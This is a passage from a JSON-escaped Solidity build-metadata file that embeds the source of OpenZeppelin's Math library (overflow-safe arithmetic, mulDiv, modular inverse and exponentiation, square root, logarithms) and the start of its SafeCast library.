* SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a - b;\\n            success = c <= a;\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow).\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            uint256 c = a * b;\\n            assembly (\\\"memory-safe\\\") {\\n                // Only true when the multiplication doesn't overflow\\n                // (c / a == b) || (a == 0)\\n                success := or(eq(div(c, a), b), iszero(a))\\n            }\\n            // equivalent to: success ? c : 0\\n            result = c * SafeCast.toUint(success);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `DIV` opcode returns zero when the denominator is 0.\\n                result := div(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a success flag (no division by zero).\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool success, uint256 result) {\\n        unchecked {\\n            success = b > 0;\\n            assembly (\\\"memory-safe\\\") {\\n                // The `MOD` opcode returns zero when the denominator is 0.\\n                result := mod(a, b)\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating addition, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingAdd(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryAdd(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating subtraction, bounds to zero instead of overflowing.\\n     */\\n    function saturatingSub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (, uint256 result) = trySub(a, b);\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Unsigned saturating multiplication, bounds to `2\\u00b2\\u2075\\u2076 - 1` instead of overflowing.\\n     */\\n    function saturatingMul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        (bool success, uint256 result) = tryMul(a, b);\\n        return ternary(success, result, type(uint256).max);\\n    }\\n\\n    /**\\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\\n     *\\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\\n     * one branch when needed, making this function more expensive.\\n     */\\n    function ternary(bool condition, uint256 a, uint256 b) internal pure returns (uint256) {\\n        unchecked {\\n            // branchless ternary works because:\\n            // b ^ (a ^ b) == a\\n            // b ^ 0 == b\\n            return b ^ ((a ^ b) * SafeCast.toUint(condition));\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a > b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return ternary(a < b, a, b);\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n\\n        // The following calculation ensures accurate ceiling division without overflow.\\n        // Since a is non-zero, (a - 1) / b will not overflow.\\n        // The largest possible result occurs when (a - 1) / b is type(uint256).max,\\n        // but the largest value we can obtain is type(uint256).max - 1, which happens\\n        // when a = type(uint256).max and b = 1.\\n        unchecked {\\n            return SafeCast.toUint(a > 0) * ((a - 1) / b + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     *\\n     * Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (high == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return low / denominator;\\n            }\\n\\n            // Make sure the result is less than 2\\u00b2\\u2075\\u2076. Also prevents denominator == 0.\\n            if (denominator <= high) {\\n                Panic.panic(ternary(denominator == 0, Panic.DIVISION_BY_ZERO, Panic.UNDER_OVERFLOW));\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [high low].\\n            uint256 remainder;\\n            assembly (\\\"memory-safe\\\") {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                high := sub(high, gt(remainder, low))\\n                low := sub(low, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator.\\n            // Always >= 1. See https://cs.stackexchange.com/q/138556/92363.\\n\\n            uint256 twos = denominator & (0 - denominator);\\n            assembly (\\\"memory-safe\\\") {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [high low] by twos.\\n                low := div(low, twos)\\n\\n                // Flip twos such that it is 2\\u00b2\\u2075\\u2076 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from high into low.\\n            low |= high * twos;\\n\\n            // Invert denominator mod 2\\u00b2\\u2075\\u2076. Now that denominator is an odd number, it has an inverse modulo 2\\u00b2\\u2075\\u2076 such\\n            // that denominator * inv \\u2261 1 mod 2\\u00b2\\u2075\\u2076. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv \\u2261 1 mod 2\\u2074.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also\\n            // works in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u2076\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b3\\u00b2\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u2076\\u2074\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b9\\u00b2\\u2078\\n            inverse *= 2 - denominator * inverse; // inverse mod 2\\u00b2\\u2075\\u2076\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2\\u00b2\\u2075\\u2076. Since the preconditions guarantee that the outcome is\\n            // less than 2\\u00b2\\u2075\\u2076, this is the final result. We don't need to compute the high bits of the result and high\\n            // is no longer required.\\n            result = low * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator, Rounding rounding) internal pure returns (uint256) {\\n        return mulDiv(x, y, denominator) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, denominator) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculates floor(x * y >> n) with full precision. Throws if result overflows a uint256.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n) internal pure returns (uint256 result) {\\n        unchecked {\\n            (uint256 high, uint256 low) = mul512(x, y);\\n            if (high >= 1 << n) {\\n                Panic.panic(Panic.UNDER_OVERFLOW);\\n            }\\n            return (high << (256 - n)) | (low >> n);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates x * y >> n with full precision, following the selected rounding direction.\\n     */\\n    function mulShr(uint256 x, uint256 y, uint8 n, Rounding rounding) internal pure returns (uint256) {\\n        return mulShr(x, y, n) + SafeCast.toUint(unsignedRoundsUp(rounding) && mulmod(x, y, 1 << n) > 0);\\n    }\\n\\n    /**\\n     * @dev Calculate the modular multiplicative inverse of a number in Z/nZ.\\n     *\\n     * If n is a prime, then Z/nZ is a field. In that case all elements are inversible, except 0.\\n     * If n is not a prime, then Z/nZ is not a field, and some elements might not be inversible.\\n     *\\n     * If the input value is not inversible, 0 is returned.\\n     *\\n     * NOTE: If you know for sure that n is (big) a prime, it may be cheaper to use Fermat's little theorem and get the\\n     * inverse using `Math.modExp(a, n - 2, n)`. See {invModPrime}.\\n     */\\n    function invMod(uint256 a, uint256 n) internal pure returns (uint256) {\\n        unchecked {\\n            if (n == 0) return 0;\\n\\n            // The inverse modulo is calculated using the Extended Euclidean Algorithm (iterative version)\\n            // Used to compute integers x and y such that: ax + ny = gcd(a, n).\\n            // When the gcd is 1, then the inverse of a modulo n exists and it's x.\\n            // ax + ny = 1\\n            // ax = 1 + (-y)n\\n            // ax \\u2261 1 (mod n) # x is the inverse of a modulo n\\n\\n            // If the remainder is 0 the gcd is n right away.\\n            uint256 remainder = a % n;\\n            uint256 gcd = n;\\n\\n            // Therefore the initial coefficients are:\\n            // ax + ny = gcd(a, n) = n\\n            // 0a + 1n = n\\n            int256 x = 0;\\n            int256 y = 1;\\n\\n            while (remainder != 0) {\\n                uint256 quotient = gcd / remainder;\\n\\n                (gcd, remainder) = (\\n                    // The old remainder is the next gcd to try.\\n                    remainder,\\n                    // Compute the next remainder.\\n                    // Can't overflow given that (a % gcd) * (gcd // (a % gcd)) <= gcd\\n                    // where gcd is at most n (capped to type(uint256).max)\\n                    gcd - remainder * quotient\\n                );\\n\\n                (x, y) = (\\n                    // Increment the coefficient of a.\\n                    y,\\n                    // Decrement the coefficient of n.\\n                    // Can overflow, but the result is casted to uint256 so that the\\n                    // next value of y is \\\"wrapped around\\\" to a value between 0 and n - 1.\\n                    x - y * int256(quotient)\\n                );\\n            }\\n\\n            if (gcd != 1) return 0; // No inverse exists.\\n            return ternary(x < 0, n - uint256(-x), uint256(x)); // Wrap the result if it's negative.\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {invMod}. More efficient, but only works if `p` is known to be a prime greater than `2`.\\n     *\\n     * From https://en.wikipedia.org/wiki/Fermat%27s_little_theorem[Fermat's little theorem], we know that if p is\\n     * prime, then `a**(p-1) \\u2261 1 mod p`. As a consequence, we have `a * a**(p-2) \\u2261 1 mod p`, which means that\\n     * `a**(p-2)` is the modular multiplicative inverse of a in Fp.\\n     *\\n     * NOTE: this function does NOT check that `p` is a prime greater than `2`.\\n     */\\n    function invModPrime(uint256 a, uint256 p) internal view returns (uint256) {\\n        unchecked {\\n            return Math.modExp(a, p - 2, p);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m)\\n     *\\n     * Requirements:\\n     * - modulus can't be zero\\n     * - underlying staticcall to precompile must succeed\\n     *\\n     * IMPORTANT: The result is only valid if the underlying call succeeds. When using this function, make\\n     * sure the chain you're using it on supports the precompiled contract for modular exponentiation\\n     * at address 0x05 as specified in https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise,\\n     * the underlying function will succeed given the lack of a revert, but the result may be incorrectly\\n     * interpreted as 0.\\n     */\\n    function modExp(uint256 b, uint256 e, uint256 m) internal view returns (uint256) {\\n        (bool success, uint256 result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the modular exponentiation of the specified base, exponent and modulus (b ** e % m).\\n     * It includes a success flag indicating if the operation succeeded. Operation will be marked as failed if trying\\n     * to operate modulo 0 or if the underlying precompile reverted.\\n     *\\n     * IMPORTANT: The result is only valid if the success flag is true. When using this function, make sure the chain\\n     * you're using it on supports the precompiled contract for modular exponentiation at address 0x05 as specified in\\n     * https://eips.ethereum.org/EIPS/eip-198[EIP-198]. Otherwise, the underlying function will succeed given the lack\\n     * of a revert, but the result may be incorrectly interpreted as 0.\\n     */\\n    function tryModExp(uint256 b, uint256 e, uint256 m) internal view returns (bool success, uint256 result) {\\n        if (m == 0) return (false, 0);\\n        assembly (\\\"memory-safe\\\") {\\n            let ptr := mload(0x40)\\n            // | Offset    | Content    | Content (Hex)                                                      |\\n            // |-----------|------------|--------------------------------------------------------------------|\\n            // | 0x00:0x1f | size of b  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x20:0x3f | size of e  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x40:0x5f | size of m  | 0x0000000000000000000000000000000000000000000000000000000000000020 |\\n            // | 0x60:0x7f | value of b | 0x<.............................................................b> |\\n            // | 0x80:0x9f | value of e | 0x<.............................................................e> |\\n            // | 0xa0:0xbf | value of m | 0x<.............................................................m> |\\n            mstore(ptr, 0x20)\\n            mstore(add(ptr, 0x20), 0x20)\\n            mstore(add(ptr, 0x40), 0x20)\\n            mstore(add(ptr, 0x60), b)\\n            mstore(add(ptr, 0x80), e)\\n            mstore(add(ptr, 0xa0), m)\\n\\n            // Given the result < m, it's guaranteed to fit in 32 bytes,\\n            // so we can use the memory scratch space located at offset 0.\\n            success := staticcall(gas(), 0x05, ptr, 0xc0, 0x00, 0x20)\\n            result := mload(0x00)\\n        }\\n    }\\n\\n    /**\\n     * @dev Variant of {modExp} that supports inputs of arbitrary length.\\n     */\\n    function modExp(bytes memory b, bytes memory e, bytes memory m) internal view returns (bytes memory) {\\n        (bool success, bytes memory result) = tryModExp(b, e, m);\\n        if (!success) {\\n            Panic.panic(Panic.DIVISION_BY_ZERO);\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Variant of {tryModExp} that supports inputs of arbitrary length.\\n     */\\n    function tryModExp(\\n        bytes memory b,\\n        bytes memory e,\\n        bytes memory m\\n    ) internal view returns (bool success, bytes memory result) {\\n        if (_zeroBytes(m)) return (false, new bytes(0));\\n\\n        uint256 mLen = m.length;\\n\\n        // Encode call args in result and move the free memory pointer\\n        result = abi.encodePacked(b.length, e.length, mLen, b, e, m);\\n\\n        assembly (\\\"memory-safe\\\") {\\n            let dataPtr := add(result, 0x20)\\n            // Write result on top of args to avoid allocating extra memory.\\n            success := staticcall(gas(), 0x05, dataPtr, mload(result), dataPtr, mLen)\\n            // Overwrite the length.\\n            // result.length > returndatasize() is guaranteed because returndatasize() == m.length\\n            mstore(result, mLen)\\n            // Set the memory pointer after the returned data.\\n            mstore(0x40, add(dataPtr, mLen))\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether the provided byte array is zero.\\n     */\\n    function _zeroBytes(bytes memory byteArray) private pure returns (bool) {\\n        for (uint256 i = 0; i < byteArray.length; ++i) {\\n            if (byteArray[i] != 0) {\\n                return false;\\n            }\\n        }\\n        return true;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded\\n     * towards zero.\\n     *\\n     * This method is based on Newton's method for computing square roots; the algorithm is restricted to only\\n     * using integer operations.\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        unchecked {\\n            // Take care of easy edge cases when a == 0 or a == 1\\n            if (a <= 1) {\\n                return a;\\n            }\\n\\n            // In this function, we use Newton's method to get a root of `f(x) := x\\u00b2 - a`. It involves building a\\n            // sequence x_n that converges toward sqrt(a). For each iteration x_n, we also define the error between\\n            // the current value as `\\u03b5_n = | x_n - sqrt(a) |`.\\n            //\\n            // For our first estimation, we consider `e` the smallest power of 2 which is bigger than the square root\\n            // of the target. (i.e. `2**(e-1) \\u2264 sqrt(a) < 2**e`). We know that `e \\u2264 128` because `(2\\u00b9\\u00b2\\u2078)\\u00b2 = 2\\u00b2\\u2075\\u2076` is\\n            // bigger than any uint256.\\n            //\\n            // By noticing that\\n            // `2**(e-1) \\u2264 sqrt(a) < 2**e \\u2192 (2**(e-1))\\u00b2 \\u2264 a < (2**e)\\u00b2 \\u2192 2**(2*e-2) \\u2264 a < 2**(2*e)`\\n            // we can deduce that `e - 1` is `log2(a) / 2`. We can thus compute `x_n = 2**(e-1)` using a method similar\\n            // to the msb function.\\n            uint256 aa = a;\\n            uint256 xn = 1;\\n\\n            if (aa >= (1 << 128)) {\\n                aa >>= 128;\\n                xn <<= 64;\\n            }\\n            if (aa >= (1 << 64)) {\\n                aa >>= 64;\\n                xn <<= 32;\\n            }\\n            if (aa >= (1 << 32)) {\\n                aa >>= 32;\\n                xn <<= 16;\\n            }\\n            if (aa >= (1 << 16)) {\\n                aa >>= 16;\\n                xn <<= 8;\\n            }\\n            if (aa >= (1 << 8)) {\\n                aa >>= 8;\\n                xn <<= 4;\\n            }\\n            if (aa >= (1 << 4)) {\\n                aa >>= 4;\\n                xn <<= 2;\\n            }\\n            if (aa >= (1 << 2)) {\\n                xn <<= 1;\\n            }\\n\\n            // We now have x_n such that `x_n = 2**(e-1) \\u2264 sqrt(a) < 2**e = 2 * x_n`. This implies \\u03b5_n \\u2264 2**(e-1).\\n            //\\n            // We can refine our estimation by noticing that the middle of that interval minimizes the error.\\n            // If we move x_n to equal 2**(e-1) + 2**(e-2), then we reduce the error to \\u03b5_n \\u2264 2**(e-2).\\n            // This is going to be our x_0 (and \\u03b5_0)\\n            xn = (3 * xn) >> 1; // \\u03b5_0 := | x_0 - sqrt(a) | \\u2264 2**(e-2)\\n\\n            // From here, Newton's method give us:\\n            // x_{n+1} = (x_n + a / x_n) / 2\\n            //\\n            // One should note that:\\n            // x_{n+1}\\u00b2 - a = ((x_n + a / x_n) / 2)\\u00b2 - a\\n            //              = ((x_n\\u00b2 + a) / (2 * x_n))\\u00b2 - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2) - a\\n            //              = (x_n\\u2074 + 2 * a * x_n\\u00b2 + a\\u00b2 - 4 * a * x_n\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u2074 - 2 * a * x_n\\u00b2 + a\\u00b2) / (4 * x_n\\u00b2)\\n            //              = (x_n\\u00b2 - a)\\u00b2 / (2 * x_n)\\u00b2\\n            //              = ((x_n\\u00b2 - a) / (2 * x_n))\\u00b2\\n            //              \\u2265 0\\n            // Which proves that for all n \\u2265 1, sqrt(a) \\u2264 x_n\\n            //\\n            // This gives us the proof of quadratic convergence of the sequence:\\n            // \\u03b5_{n+1} = | x_{n+1} - sqrt(a) |\\n            //         = | (x_n + a / x_n) / 2 - sqrt(a) |\\n            //         = | (x_n\\u00b2 + a - 2*x_n*sqrt(a)) / (2 * x_n) |\\n            //         = | (x_n - sqrt(a))\\u00b2 / (2 * x_n) |\\n            //         = | \\u03b5_n\\u00b2 / (2 * x_n) |\\n            //         = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //\\n            // For the first iteration, we have a special case where x_0 is known:\\n            // \\u03b5_1 = \\u03b5_0\\u00b2 / | (2 * x_0) |\\n            //     \\u2264 (2**(e-2))\\u00b2 / (2 * (2**(e-1) + 2**(e-2)))\\n            //     \\u2264 2**(2*e-4) / (3 * 2**(e-1))\\n            //     \\u2264 2**(e-3) / 3\\n            //     \\u2264 2**(e-3-log2(3))\\n            //     \\u2264 2**(e-4.5)\\n            //\\n            // For the following iterations, we use the fact that, 2**(e-1) \\u2264 sqrt(a) \\u2264 x_n:\\n            // \\u03b5_{n+1} = \\u03b5_n\\u00b2 / | (2 * x_n) |\\n            //         \\u2264 (2**(e-k))\\u00b2 / (2 * 2**(e-1))\\n            //         \\u2264 2**(2*e-2*k) / 2**e\\n            //         \\u2264 2**(e-2*k)\\n            xn = (xn + a / xn) >> 1; // \\u03b5_1 := | x_1 - sqrt(a) | \\u2264 2**(e-4.5)  -- special case, see above\\n            xn = (xn + a / xn) >> 1; // \\u03b5_2 := | x_2 - sqrt(a) | \\u2264 2**(e-9)    -- general case with k = 4.5\\n            xn = (xn + a / xn) >> 1; // \\u03b5_3 := | x_3 - sqrt(a) | \\u2264 2**(e-18)   -- general case with k = 9\\n            xn = (xn + a / xn) >> 1; // \\u03b5_4 := | x_4 - sqrt(a) | \\u2264 2**(e-36)   -- general case with k = 18\\n            xn = (xn + a / xn) >> 1; // \\u03b5_5 := | x_5 - sqrt(a) | \\u2264 2**(e-72)   -- general case with k = 36\\n            xn = (xn + a / xn) >> 1; // \\u03b5_6 := | x_6 - sqrt(a) | \\u2264 2**(e-144)  -- general case with k = 72\\n\\n            // Because e \\u2264 128 (as discussed during the first estimation phase), we know have reached a precision\\n            // \\u03b5_6 \\u2264 2**(e-144) < 1. Given we're operating on integers, then we can ensure that xn is now either\\n            // sqrt(a) or sqrt(a) + 1.\\n            return xn - SafeCast.toUint(xn > a / xn);\\n        }\\n    }\\n\\n    /**\\n     * @dev Calculates sqrt(a), following the selected rounding direction.\\n     */\\n    function sqrt(uint256 a, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = sqrt(a);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && result * result < a);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // If upper 8 bits of 16-bit half set, add 8 to result\\n        r |= SafeCast.toUint((x >> r) > 0xff) << 3;\\n        // If upper 4 bits of 8-bit half set, add 4 to result\\n        r |= SafeCast.toUint((x >> r) > 0xf) << 2;\\n\\n        // Shifts value right by the current result and use it as an index into this lookup table:\\n        //\\n        // | x (4 bits) |  index  | table[index] = MSB position |\\n        // |------------|---------|-----------------------------|\\n        // |    0000    |    0    |        table[0] = 0         |\\n        // |    0001    |    1    |        table[1] = 0         |\\n        // |    0010    |    2    |        table[2] = 1         |\\n        // |    0011    |    3    |        table[3] = 1         |\\n        // |    0100    |    4    |        table[4] = 2         |\\n        // |    0101    |    5    |        table[5] = 2         |\\n        // |    0110    |    6    |        table[6] = 2         |\\n        // |    0111    |    7    |        table[7] = 2         |\\n        // |    1000    |    8    |        table[8] = 3         |\\n        // |    1001    |    9    |        table[9] = 3         |\\n        // |    1010    |   10    |        table[10] = 3        |\\n        // |    1011    |   11    |        table[11] = 3        |\\n        // |    1100    |   12    |        table[12] = 3        |\\n        // |    1101    |   13    |        table[13] = 3        |\\n        // |    1110    |   14    |        table[14] = 3        |\\n        // |    1111    |   15    |        table[15] = 3        |\\n        //\\n        // The lookup table is represented as a 32-byte value with the MSB positions for 0-15 in the last 16 bytes.\\n        assembly (\\\"memory-safe\\\") {\\n            r := or(r, byte(shr(r, x), 0x0000010102020202030303030303030300000000000000000000000000000000))\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 2, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log2(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log2(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value) internal pure returns (uint256) {\\n        uint256 result = 0;\\n        unchecked {\\n            if (value >= 10 ** 64) {\\n                value /= 10 ** 64;\\n                result += 64;\\n            }\\n            if (value >= 10 ** 32) {\\n                value /= 10 ** 32;\\n                result += 32;\\n            }\\n            if (value >= 10 ** 16) {\\n                value /= 10 ** 16;\\n                result += 16;\\n            }\\n            if (value >= 10 ** 8) {\\n                value /= 10 ** 8;\\n                result += 8;\\n            }\\n            if (value >= 10 ** 4) {\\n                value /= 10 ** 4;\\n                result += 4;\\n            }\\n            if (value >= 10 ** 2) {\\n                value /= 10 ** 2;\\n                result += 2;\\n            }\\n            if (value >= 10 ** 1) {\\n                result += 1;\\n            }\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Return the log in base 10, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log10(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log10(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 10 ** result < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256 of a positive value rounded towards zero.\\n     * Returns 0 if given 0.\\n     *\\n     * Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string.\\n     */\\n    function log256(uint256 x) internal pure returns (uint256 r) {\\n        // If value has upper 128 bits set, log2 result is at least 128\\n        r = SafeCast.toUint(x > 0xffffffffffffffffffffffffffffffff) << 7;\\n        // If upper 64 bits of 128-bit half set, add 64 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffffffffffff) << 6;\\n        // If upper 32 bits of 64-bit half set, add 32 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffffffff) << 5;\\n        // If upper 16 bits of 32-bit half set, add 16 to result\\n        r |= SafeCast.toUint((x >> r) > 0xffff) << 4;\\n        // Add 1 if upper 8 bits of 16-bit half set, and divide accumulated result by 8\\n        return (r >> 3) | SafeCast.toUint((x >> r) > 0xff);\\n    }\\n\\n    /**\\n     * @dev Return the log in base 256, following the selected rounding direction, of a positive value.\\n     * Returns 0 if given 0.\\n     */\\n    function log256(uint256 value, Rounding rounding) internal pure returns (uint256) {\\n        unchecked {\\n            uint256 result = log256(value);\\n            return result + SafeCast.toUint(unsignedRoundsUp(rounding) && 1 << (result << 3) < value);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns whether a provided rounding mode is considered rounding up for unsigned integers.\\n     */\\n    function unsignedRoundsUp(Rounding rounding) internal pure returns (bool) {\\n        return uint8(rounding) % 2 == 1;\\n    }\\n}\\n\",\"keccak256\":\"0x1225214420c83ebcca88f2ae2b50f053aaa7df7bd684c3e878d334627f2edfc6\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/SafeCast.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SafeCast.sol)\\n// This file was procedurally generated from scripts/generate/templates/SafeCast.js.\\n\\npragma solidity ^0.8.20;\\n\\n/**\\n * @dev Wrappers over Solidity's uintXX/intXX/bool casting operators with added overflow\\n * checks.\\n *\\n * Downcasting from uint256/int256 in Solidity does not revert on overflow. This can\\n * easily result in undesired exploitation or bugs, since developers usually\\n * assume that overflows raise errors. `SafeCast` restores this intuition by\\n * reverting the transaction when such an operation overflows.\\n *\\n * Using this library instead of the unchecked operations eliminates an entire\\n * class of bugs, so it's recommended to use it always.\\n */\\nlibrary SafeCast {\\n    /**\\n     * @dev Value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedUintDowncast(uint8 bits, uint256 value);\\n\\n    /**\\n     * @dev An int value doesn't fit in an uint of `bits` size.\\n     */\\n    error SafeCastOverflowedIntToUint(int256 value);\\n\\n    /**\\n     * @dev Value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedIntDowncast(uint8 bits, int256 value);\\n\\n    /**\\n     * @dev An uint value doesn't fit in an int of `bits` size.\\n     */\\n    error SafeCastOverflowedUintToInt(uint256 value);\\n\\n    /**\\n     * @dev Returns the downcasted uint248 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint248).\\n     *\\n     * Counterpart to Solidity's `uint248` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 248 bits\\n     */\\n    function toUint248(uint256 value) internal pure returns (uint248) {\\n        if (value > type(uint248).max) {\\n            revert SafeCastOverflowedUintDowncast(248, value);\\n        }\\n        return uint248(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint240 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint240).\\n     *\\n     * Counterpart to Solidity's `uint240` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 240 bits\\n     */\\n    function toUint240(uint256 value) internal pure returns (uint240) {\\n        if (value > type(uint240).max) {\\n            revert SafeCastOverflowedUintDowncast(240, value);\\n        }\\n        return uint240(value);\\n    }\\n\\n    /**\\n     * @dev Returns the downcasted uint232 from uint256, reverting on\\n     * overflow (when the input is greater than largest uint232).\\n     *\\n     * Counterpart to Solidity's `uint232` operator.\\n     *\\n     * Requirements:\\n     *\\n     * - input must fit into 232 bits\\n     */\\n    function toUint232(uint256 value) internal pure returns (uint232) {\\n        if (value > type(uint232).max) {\\n            revert 